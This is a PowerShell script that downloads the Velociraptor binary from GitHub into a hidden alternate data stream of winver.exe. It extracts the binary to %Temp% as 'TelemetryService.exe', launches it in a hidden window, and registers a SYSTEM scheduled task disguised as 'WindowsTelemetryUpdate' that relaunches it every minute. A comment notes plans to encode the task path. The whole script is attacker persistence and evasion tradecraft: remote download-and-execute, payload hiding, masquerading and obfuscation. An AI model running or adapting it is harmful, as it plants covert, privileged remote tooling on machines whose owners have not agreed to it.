# === CONFIG ===
$hostFile     = "$env:SystemRoot\System32\winver.exe"
$adsStream    = "$hostFile:TelemetryService.exe"
$tempPath     = "$env:Temp\TelemetryService.exe"
$taskName     = "WindowsTelemetryUpdate"
$downloadUrl  = "https://github.com/Velocidex/velociraptor/releases/download/v0.75/velociraptor-v0.75.2-windows-amd64.exe"
$logPath      = "$env:Temp\telemetry_exec.log"

# === STEP 1: Download Velociraptor to ADS ===
curl.exe -L -o $adsStream $downloadUrl

# === STEP 2: Confirm ADS presence ===
if (Get-Item -Path $adsStream -ErrorAction SilentlyContinue) {
    Write-Host "Velociraptor stored in ADS successfully."

    # === STEP 3: Extract to temp ===
    Copy-Item -Path $adsStream -Destination $tempPath

    # === STEP 4: Launch hidden and detached ===
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $tempPath
    $psi.Arguments = "gui"
    $psi.WindowStyle = "Hidden"
    $psi.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($psi)

    # === STEP 5: Scheduled Task ===
    # WORKING HERE TO ENCODE THIS TO PROTECT PATH
    schtasks /Create /SC MINUTE /MO 1 /TN "WindowsTelemetryUpdate" /TR "powershell.exe -NoProfile -WindowStyle Hidden -Command Start-Process '$env:Temp\TelemetryService.exe' -ArgumentList gui -WindowStyle Hidden" /RU SYSTEM /F
}